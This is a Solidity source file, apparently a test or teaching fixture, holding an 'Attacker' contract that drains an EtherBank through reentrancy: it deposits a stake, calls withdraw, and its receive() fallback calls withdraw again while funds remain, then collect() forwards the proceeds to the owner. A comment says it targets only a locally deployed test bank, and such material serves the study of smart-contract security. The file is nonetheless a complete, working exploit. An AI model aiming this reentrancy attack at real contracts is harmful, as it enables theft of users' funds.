// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;
interface IEtherBank {
    function deposit() external payable;
    function withdraw() external;
}
/// @notice Educational attacker targeting only a bank deployed by the local tests.
contract Attacker {
    IEtherBank public immutable bank;
    address payable public immutable owner;
    uint256 public immutable unit;
    uint256 public callbacks;
    constructor(address bankAddress, uint256 unitStake) {
        require(bankAddress != address(0) && unitStake > 0, "invalid setup");
        bank = IEtherBank(bankAddress);
        unit = unitStake;
        owner = payable(msg.sender);
    }
    modifier onlyOwner() { require(msg.sender == owner, "only owner"); _; }
    function attack() external payable onlyOwner {
        require(msg.value == unit, "wrong stake");
        bank.deposit{value: unit}();
        bank.withdraw();
    }
    receive() external payable {
        require(msg.sender == address(bank), "only bank");
        callbacks++;
        if (address(bank).balance >= unit) bank.withdraw();
    }
    function collect() external onlyOwner {
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok, "collect failed");
    }
}
